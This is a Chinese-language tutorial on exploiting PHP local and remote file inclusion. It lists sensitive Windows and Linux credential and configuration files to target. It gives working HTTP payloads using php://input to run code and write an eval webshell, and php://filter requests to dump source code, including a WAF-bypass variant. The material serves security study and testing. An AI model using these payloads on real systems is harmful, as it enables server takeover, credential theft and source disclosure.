---
title: "PHP文件包含利用"
author: ["4shen0ne"]
draft: false
---

## 介绍 {#介绍}

文件包含的相关函数：

1.  include()
2.  include_once()
3.  require()
4.  require_once()

include 函数如果出错仍会执行后续代码，但 require 函数出错则程序中止，xxx_once 函数表
示只包含目标文件一次，避免函数重定义和变量覆盖问题

文件包含分为本地文件包含（LFI）和远程文件包含（RFI）两类，RFI 需要在 php.ini 文件中
配置：

```nil
allow_url_fopen = On
allow_url_include = On
```

Windows 敏感文件：

```nil
c:/boot.ini //查看系统版本
c:/windows/php.ini //php配置信息
c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
c:/winnt/php.ini
c:/winnt/my.ini
C:\Windows\win.ini  //用于保存系统配置文件
c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码
c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码
c:\Program Files\Serv-U\ServUDaemon.ini
c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置
c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码
c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此
c:\Program Files\RhinoSoft.com\ServUDaemon.exe
C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif //存储了pcAnywhere的登陆密码
c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件
c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.
c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
d:\APACHE\Apache2\conf\httpd.conf
C:\Program Files\mysql\my.ini
C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
```

Lunix/Unix 敏感文件：

```nil
/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
/usr/local/apache2/conf/httpd.conf
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/usr/local/app/php5/lib/php.ini //PHP相关设置
/etc/sysconfig/iptables //从中得到防火墙规则策略
/etc/httpd/conf/httpd.conf // apache配置文件
/etc/rsyncd.conf //同步程序配置文件
/etc/my.cnf //mysql的配置文件
/etc/redhat-release //系统版本
/etc/issue
/etc/issue.net
/usr/local/app/php5/lib/php.ini //PHP相关设置
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件
/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
/etc/sysconfig/iptables 查看防火墙策略
```


## PHP 伪协议 {#php-伪协议}


### php://input {#php-input}

可以访问请求的原始数据的只读流，即可以直接读取到 POST 中没有经过解析的原始数据

要求 `allow_url_include = On`

```restclient
POST http://localhost/fileinclude.php?file=php://input

<?php phpinfo(); ?>
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 1:</span>
  demo1
</div>

```restclient
POST http://localhost/fileinclude.php?file=php://input

<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[v])?>');?>
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 2:</span>
  demo2-写shell
</div>


### php://filter {#php-filter}

元封装器，设计用于“数据流打开”时的“筛选过滤”应用，对本地磁盘文件进行读写

```restclient
GET http://localhost/fileinclude.php?file=php://filter/read=convert.base64-encode/resource=index.php
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 3:</span>
  demo1
</div>

```restclient
# 少了read关键字，绕waf时可以尝试
GET http://localhost/fileinclude.php?file=php://filter/convert.base64-encode/resource=index.php
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 4:</span>
  demo2
</div>
